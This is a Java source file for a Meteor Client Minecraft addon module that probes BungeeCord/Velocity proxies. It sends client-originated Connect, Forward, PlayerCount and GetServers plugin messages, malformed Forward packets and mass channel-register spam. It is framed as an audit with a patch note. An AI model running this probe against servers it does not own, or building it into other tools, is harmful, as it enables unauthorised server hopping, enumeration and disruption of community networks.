package com.example.addon.modules.testing;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.util.Identifier;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;
import java.nio.charset.StandardCharsets;

/**
 * AUDIT: Plugin Message Probe (BungeeCord/Velocity proxy messaging)
 *
 * PLATFORM: Paper-specific (proxy-backed networks; needs bungeecord:true in
 * spigot.yml / a proxy in front).
 *
 * On a proxied network the backend forwards plugin messages on the bungeecord:main
 * channel, and the BungeeCord/Velocity messaging API is a classic abuse surface: a
 * client that can emit these messages may ask the proxy to connect it elsewhere,
 * forward arbitrary payloads to other backends, or enumerate servers/players. This
 * sends well-formed and malformed BungeeCord messages, plus channel
 * register/unregister spam, and watches for kicks.
 *
 *   What it exploits: a backend that trusts client-originated plugin messages and a
 *     proxy that acts on them without verifying they came from a plugin, not a
 *     player.
 *   Patch signal (any well-implemented setup): the proxy/backend must NOT act on
 *     bungeecord:main messages that originate from a client; treat player-sent
 *     plugin messages as untrusted, and bound channel registrations.
 *
 * The channels (bungeecord:main, minecraft:register/unregister) are registered as
 * outbound payload types at addon init. Run on YOUR network only.
 */
public class PluginMessageProbe extends Module {
    public enum Mode { BUNGEE_CONNECT, BUNGEE_FORWARD, BUNGEE_PLAYERCOUNT, BUNGEE_GETSERVERS, BUNGEE_MALFORMED, CHANNEL_REGISTER_SPAM }

    public static final Identifier BUNGEE = Identifier.of("bungeecord", "main");
    public static final Identifier REGISTER = Identifier.of("minecraft", "register");
    public static final Identifier UNREGISTER = Identifier.of("minecraft", "unregister");

    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Mode> mode = sgGeneral.add(new EnumSetting.Builder<Mode>()
        .name("mode").description("Which plugin-message scenario to send.")
        .defaultValue(Mode.BUNGEE_GETSERVERS).build()
    );
    private final Setting<String> server = sgGeneral.add(new StringSetting.Builder()
        .name("server").description("Target backend server name (Connect/Forward/PlayerCount).")
        .defaultValue("lobby").build()
    );
    private final Setting<Integer> delayTicks = sgGeneral.add(new IntSetting.Builder()
        .name("delay-ticks").description("Ticks between sends.")
        .defaultValue(20).range(1, 200).sliderRange(5, 100).build()
    );
    private final Setting<Integer> regCount = sgGeneral.add(new IntSetting.Builder()
        .name("register-count").description("Channels per register message (CHANNEL_REGISTER_SPAM).")
        .defaultValue(50).range(1, 2000).sliderRange(10, 500)
        .visible(() -> mode.get() == Mode.CHANNEL_REGISTER_SPAM).build()
    );

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print summary on deactivate.")
        .defaultValue(true).build()
    );

    private int timer = 0, sent = 0;

    public PluginMessageProbe() {
        super(AddonTemplate.TESTING_CATEGORY, "plugin-message-probe",
            "Sends BungeeCord/Velocity plugin messages (Connect/Forward/PlayerCount/GetServers/malformed) and channel register spam. Tests proxy plugin-message trust.");
    }

    @Override
    public void onActivate() { timer = 0; sent = 0; }

    private void sendBungee(byte[] body) {
        mc.player.networkHandler.sendPacket(new CustomPayloadC2SPacket(new PluginChannelPayload(BUNGEE, body)));
        sent++;
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        if (timer > 0) { timer--; return; }
        timer = delayTicks.get();

        try {
            switch (mode.get()) {
                case BUNGEE_CONNECT -> { var b = new Buf(); b.out.writeUTF("Connect"); b.out.writeUTF(server.get()); sendBungee(b.bytes()); }
                case BUNGEE_PLAYERCOUNT -> { var b = new Buf(); b.out.writeUTF("PlayerCount"); b.out.writeUTF(server.get()); sendBungee(b.bytes()); }
                case BUNGEE_GETSERVERS -> { var b = new Buf(); b.out.writeUTF("GetServers"); sendBungee(b.bytes()); }
                case BUNGEE_FORWARD -> {
                    var b = new Buf(); b.out.writeUTF("Forward"); b.out.writeUTF(server.get()); b.out.writeUTF("acaudit:probe");
                    byte[] payload = "audit".getBytes(StandardCharsets.UTF_8);
                    b.out.writeShort(payload.length); b.out.write(payload); sendBungee(b.bytes());
                }
                case BUNGEE_MALFORMED -> {
                    // valid subchannel header, truncated/garbage body
                    var b = new Buf(); b.out.writeUTF("Forward"); b.out.writeShort(30000); b.out.write(new byte[]{1, 2, 3}); sendBungee(b.bytes());
                }
                case CHANNEL_REGISTER_SPAM -> {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < regCount.get(); i++) { if (i > 0) sb.append('\0'); sb.append("acaudit:c").append(i); }
                    mc.player.networkHandler.sendPacket(new CustomPayloadC2SPacket(
                        new PluginChannelPayload(REGISTER, sb.toString().getBytes(StandardCharsets.UTF_8))));
                    sent++;
                }
            }
            info("Sent %s (#%d).", mode.get(), sent);
        } catch (Exception e) {
            warning("Build error: %s", e.getMessage());
        }
    }

    private static final class Buf {
        final ByteArrayOutputStream baos = new ByteArrayOutputStream();
        final DataOutputStream out = new DataOutputStream(baos);
        byte[] bytes() throws java.io.IOException { out.flush(); return baos.toByteArray(); }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) info("Summary: %d plugin messages sent.", sent);
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (autoDisable.get() && isActive()) toggle();
    }
}
